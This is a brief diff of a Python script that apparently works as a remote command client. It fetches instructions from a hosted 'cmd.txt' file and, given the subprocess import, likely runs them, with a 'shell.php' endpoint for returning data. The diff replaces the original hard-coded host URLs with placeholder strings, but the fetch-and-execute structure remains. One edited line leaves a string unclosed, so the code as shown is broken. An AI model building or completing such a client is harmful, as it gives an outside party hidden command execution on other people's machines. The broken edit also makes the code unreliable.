@@ -1,8 +1,8 @@
 import requests
 import sys
 import subprocess
-url = "https://webdevsblog.000webhostapp.com/cmd.txt"
-url1 = "https://webdevsblog.000webhostapp.com/shell.php"
+url = "Website link to read from"
+url1 = "Website link with a php script to write data
 def sleep_check():
     req = requests.get(url)
     req1 = req.text
